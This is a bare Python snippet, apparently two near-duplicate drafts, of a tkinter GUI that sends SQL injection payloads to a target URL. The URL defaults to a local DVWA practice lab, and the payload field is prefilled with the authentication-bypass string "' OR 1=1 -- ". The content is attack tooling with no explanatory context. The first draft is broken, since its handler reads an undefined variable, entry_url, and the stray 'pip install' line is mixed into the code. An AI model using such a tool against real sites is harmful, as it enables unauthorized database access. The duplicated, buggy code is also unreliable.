pip install requests

import tkinter as tk
import requests

def try_injection():
    target_url = entry_url.get()
    payload = epayload.get()
    params = {"user": payload, "pass": "anything"}
    res = requests.get(target_url, params=params)
    tresult.delete("1.0", tk.END)
    tresult.insert(tk.END, res.text[:100])
root = tk.Tk()
root.title("SQLin")
tk.Label(root, text="Target URL:").pack()
eurl = tk.Entry(root, width=50)
eurl.insert(0, "http://localhost/dvwa/vulnerabilities/sqli/?id=")
eurl.pack()
tk.Label(root, text="Payload:").pack()
epayload = tk.Entry(root, width=50)
epayload.insert(0, "' OR 1=1 -- ")
epayload.pack()
tk.Button(root, text="Try Injection", command=try_injection).pack()
tresult = tk.Text(root, height=20, width=60)
tresult.pack()
root.mainloop()



import tkinter as tk
import requests

def try_injection():
    turl = eurl.get()
    pd = epd.get()
    params = {"user": pd, "pass": "anything"}
    res = requests.get(turl, params=params)
    tresult.delete("1.0", tk.END)
    tresult.insert(tk.END, res.text[:100])

root = tk.Tk()
root.title("SQLi Tester")
tk.Label(root, text="Target URL:").pack()
eurl = tk.Entry(root, width=50)
eurl.insert(0, "http://localhost/dvwa/vulnerabilities/sqli/?id=")
eurl.pack()
tk.Label(root, text="Pd:").pack()
epd = tk.Entry(root, width=50)
epd.insert(0, "' OR 1=1 -- ")
epd.pack()
tk.Button(root, text="Try", command=try_injection).pack()
tresult = tk.Text(root, height=20, width=60)
tresult.pack()
root.mainloop()
